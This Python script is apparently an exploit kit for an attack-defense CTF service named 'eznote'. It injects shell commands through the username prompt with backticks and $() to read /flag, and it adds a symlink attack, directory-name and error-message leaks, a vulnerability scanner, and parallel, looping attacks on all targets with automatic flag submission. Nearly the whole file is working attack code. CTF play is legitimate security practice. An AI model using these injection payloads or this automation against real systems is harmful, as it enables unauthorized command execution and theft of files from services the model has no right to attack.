#!/usr/bin/env python3
"""
eznote - Multi-Method Exploit v3
================================
Combines all exploit methods for maximum reliability.

Vulnerabilities exploited:
1. Command Injection via backticks/$(...)  
2. Symlink Attack for file read
3. Directory Name Leak

Usage:
    python3 eznote_exploit_v3.py              # Attack all targets
    python3 eznote_exploit_v3.py 172.28.31.32 # Attack specific IP
    python3 eznote_exploit_v3.py --loop       # Run continuously  
    python3 eznote_exploit_v3.py --scan       # Scan for vulnerabilities
    python3 eznote_exploit_v3.py local        # Test locally
"""

import sys
import os
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

os.environ['PWNLIB_NOTERM'] = '1'

from pwn import *
from pwn_lib import shortcuts
from awd_lib import submit, targets, our_ip, setup_auth

# === CONFIG ===
PORT = 1000
TIMEOUT = 5
LOOP_DELAY = 30        # Faster rounds for AWD
MAX_WORKERS = 8        # More parallel threads
MAX_RETRIES = 2        # Retry failed attempts

context.log_level = 'error'
context.timeout = TIMEOUT

# Flag patterns to search for
FLAG_PATTERNS = [
    rb'(hkcert\d*\{[^}]+\})',
    rb'(flag\{[^}]+\})',
    rb'(FLAG\{[^}]+\})',
    rb'(ctf\{[^}]+\})',
]


def extract_flag(data):
    """Extract flag from data using multiple patterns."""
    if isinstance(data, str):
        data = data.encode()
    for pattern in FLAG_PATTERNS:
        match = re.search(pattern, data, re.IGNORECASE)
        if match:
            return match.group(1).decode()
    return None


# =============================================================================
# METHOD 1: Direct Command Injection (fastest, most reliable)
# =============================================================================

def method_cmd_injection(ip, port):
    """Direct command injection with stderr output - single fast attempt."""
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        
        # Fast path - single command, minimal interaction
        io.recvuntil(b'Username: ')
        io.sendline(b'x`cat /flag >&2`')
        io.recvuntil(b'> ')
        io.sendline(b'2')
        
        data = io.recvrepeat(0.3)
        io.close()
        
        return extract_flag(data)
    except:
        return None


def method_cmd_injection_dollar(ip, port):
    """Command injection using $() - fallback if backticks patched."""
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        
        io.recvuntil(b'Username: ')
        io.sendline(b'x$(cat /flag >&2)')
        io.recvuntil(b'> ')
        io.sendline(b'2')
        
        data = io.recvrepeat(0.3)
        io.close()
        
        return extract_flag(data)
    except:
        return None


# =============================================================================
# METHOD 2: Symlink Attack (arbitrary file read)
# =============================================================================

def method_symlink(ip, port):
    """Symlink attack to read /flag via show_note."""
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        s = shortcuts(io)
        
        # Step 1: Create user directory
        s.ru(b'Username: ')
        io.sendline(b'test')
        s.sla(b'> ', b'2')
        
        # Step 2: Create symlink via command injection
        s.sla(b'> ', b'1')
        s.ru(b'Username: ')
        io.sendline(b'x`ln -sf /flag $(ls -d /tmp/$PPID/*/test)/aa`')
        s.sla(b'> ', b'2')
        
        # Step 3: Switch back to test user
        s.sla(b'> ', b'1')
        s.ru(b'Username: ')
        io.sendline(b'test')
        
        # Step 4: Read via show_note
        s.sla(b'> ', b'4')
        s.ru(b'note name: ')
        io.sendline(b'aa')
        
        data = io.recvrepeat(0.5)
        io.close()
        
        # Check for Note content:
        match = re.search(rb'Note content: ([^\n]+)', data)
        if match:
            content = match.group(1).decode().strip()
            if '{' in content:
                return content
        
        return extract_flag(data)
        
    except:
        return None


# =============================================================================
# METHOD 3: Directory Name Leak
# =============================================================================

def method_dirleak(ip, port):
    """Leak flag via directory name creation."""
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        s = shortcuts(io)
        
        # Create dir with flag content in name
        s.ru(b'Username: ')
        io.sendline(b'a$(cat /flag)')
        s.sla(b'> ', b'2')
        
        # List directory to get the name
        s.sla(b'> ', b'1')
        s.ru(b'Username: ')
        io.sendline(b'x`ls /tmp/$PPID/*/ >&2`')
        s.sla(b'> ', b'2')
        
        data = io.recvrepeat(0.5)
        io.close()
        
        return extract_flag(data)
        
    except:
        return None


# =============================================================================
# METHOD 4: Long Filename Error Leak  
# =============================================================================

def method_mkdir_error(ip, port):
    """Exploit mkdir error message to leak flag."""
    try:
        io = remote(ip, port, timeout=TIMEOUT)
        s = shortcuts(io)
        
        # Write flag to temp file
        s.ru(b'Username: ')
        io.sendline(b'`cat /flag > /tmp/f`a')
        s.sla(b'> ', b'2')
        
        # Read with padding to cause long filename error
        s.sla(b'> ', b'1')
        s.ru(b'Username: ')
        io.sendline(b'`cat /tmp/f;seq 1 100`')  # Add padding
        s.sla(b'> ', b'2')
        
        data = io.recvrepeat(1)
        io.close()
        
        return extract_flag(data)
        
    except:
        return None


# =============================================================================
# MAIN EXPLOIT FUNCTION
# =============================================================================

def exploit(ip, port, fast=True):
    """Try methods until one succeeds. fast=True uses only quickest method."""
    if fast:
        # Fast mode - just try the quickest method
        flag = method_cmd_injection(ip, port)
        if flag:
            return flag
        # Fallback to $() if backticks might be patched
        return method_cmd_injection_dollar(ip, port)
    
    # Full mode - try all methods
    methods = [
        ("cmd_injection", method_cmd_injection),
        ("cmd_dollar", method_cmd_injection_dollar),
        ("symlink", method_symlink),
        ("dirleak", method_dirleak),
        ("mkdir_error", method_mkdir_error),
    ]
    
    for name, method in methods:
        try:
            flag = method(ip, port)
            if flag:
                return flag
        except:
            continue
    
    return None


def check_vuln(ip, port):
    """Quick check which vulnerabilities are present."""
    vulns = {'backtick': False, 'dollar': False, 'reachable': False}
    
    try:
        io = remote(ip, port, timeout=3)
        vulns['reachable'] = True
        
        # Test backtick
        io.recvuntil(b'Username: ', timeout=2)
        io.sendline(b'`echo t`')
        resp = io.recvuntil(b'> ', timeout=2)
        if b'Bad username' not in resp:
            vulns['backtick'] = True
        
        # Test $()
        io.sendline(b'1')
        io.recvuntil(b'Username: ', timeout=2)
        io.sendline(b'$(echo t)')
        resp = io.recvuntil(b'> ', timeout=2)
        if b'Bad username' not in resp:
            vulns['dollar'] = True
        
        io.close()
    except:
        pass
    
    return vulns


# =============================================================================
# RUNNER FUNCTIONS
# =============================================================================

def run_single(ip, verbose=True, retries=MAX_RETRIES):
    """Run exploit against a single target with retry logic."""
    if verbose:
        print(f"[*] {ip}:{PORT} ...", end=" ", flush=True)
    
    for attempt in range(retries + 1):
        flag = exploit(ip, PORT, fast=(attempt == 0))  # Fast on first try
        
        if flag:
            if verbose:
                print(f"FLAG: {flag[:30]}...")
            result = submit(flag, target=ip)
            if result["success"]:
                status = "dup" if result["duplicate"] else "NEW!"
                if verbose:
                    print(f"    [{status}]")
                return flag
            else:
                if verbose:
                    print(f"    [submit failed: {result['message']}]")
                return flag  # Return flag even if submit failed
    
    if verbose:
        print("no flag")
    return None


def run_all(parallel=True):
    """Run exploit against all targets."""
    target_list = targets()
    
    print(f"[*] Targets: {len(target_list)} | Port: {PORT} | Workers: {MAX_WORKERS}")
    
    success = 0
    failed = 0
    flags = {}
    
    start = time.time()
    
    if parallel and len(target_list) > 1:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {executor.submit(run_single, ip, False): ip for ip in target_list}
            for future in as_completed(futures):
                ip = futures[future]
                try:
                    result = future.result()
                    if result:
                        success += 1
                        flags[ip] = result
                        print(f"[+] {ip}: {result[:25]}...")
                    else:
                        failed += 1
                except Exception as e:
                    failed += 1
    else:
        for ip in target_list:
            result = run_single(ip, verbose=True)
            if result:
                success += 1
                flags[ip] = result
            else:
                failed += 1
    
    elapsed = time.time() - start
    print(f"\n[*] Done: {success}/{len(target_list)} in {elapsed:.1f}s")
    return flags


def run_loop():
    """Run exploit continuously."""
    print(f"[*] Loop mode - Ctrl+C to stop")
    print(f"[*] Delay: {LOOP_DELAY}s")
    
    round_num = 0
    while True:
        round_num += 1
        print(f"\n{'='*50}")
        print(f"ROUND {round_num} - {time.strftime('%H:%M:%S')}")
        print(f"{'='*50}")
        
        try:
            run_all()
        except KeyboardInterrupt:
            print("\n[!] Stopped")
            break
        except Exception as e:
            print(f"[-] Error: {e}")
        
        print(f"[*] Next round in {LOOP_DELAY}s...")
        try:
            time.sleep(LOOP_DELAY)
        except KeyboardInterrupt:
            print("\n[!] Stopped")
            break


def run_scan():
    """Scan all targets for vulnerabilities."""
    print(f"[*] Scanning {len(targets())} targets...")
    print()
    
    for ip in targets():
        vulns = check_vuln(ip, PORT)
        if not vulns['reachable']:
            print(f"{ip}: UNREACHABLE")
        else:
            status = []
            if vulns['backtick']:
                status.append("backtick")
            if vulns['dollar']:
                status.append("dollar")
            print(f"{ip}: {', '.join(status) if status else 'PATCHED'}")


def run_local():
    """Test locally."""
    os.system('echo "hkcert24{local_test_v3}" > /tmp/flag')
    
    print("[*] Testing all methods locally...")
    print()
    
    io = process('./src/chall')
    pid = io.pid
    io.close()
    
    # Test each method
    methods = [
        ("cmd_injection", method_cmd_injection),
        ("symlink", method_symlink),
        ("dirleak", method_dirleak),
    ]
    
    for name, method in methods:
        print(f"[*] Testing {name}...", end=" ")
        try:
            flag = method("127.0.0.1", 0)  # Won't work, need local process
        except:
            pass
        print("(need local server)")
    
    # Test with actual process
    print()
    print("[*] Testing with local process...")
    
    io = process('./src/chall')
    s = shortcuts(io)
    
    s.ru(b'Username: ')
    io.sendline(b'x`cat /tmp/flag >&2`')
    s.sla(b'> ', b'2')
    
    data = io.recvrepeat(0.5)
    io.close()
    
    flag = extract_flag(data)
    if flag:
        print(f"[+] Got flag: {flag}")
    else:
        print(f"[-] No flag in output: {data[:100]}")


def main():
    try:
        setup_auth()
    except:
        pass
    
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        
        if arg == "local":
            context.log_level = 'info'
            run_local()
        elif arg in ("--loop", "-l"):
            run_loop()
        elif arg in ("--scan", "-s"):
            run_scan()
        elif arg in ("--seq", "--sequential"):
            run_all(parallel=False)
        elif arg in ("--help", "-h"):
            print(__doc__)
        else:
            # Attack specific IP
            run_single(arg)
    else:
        run_all()


if __name__ == "__main__":
    main()
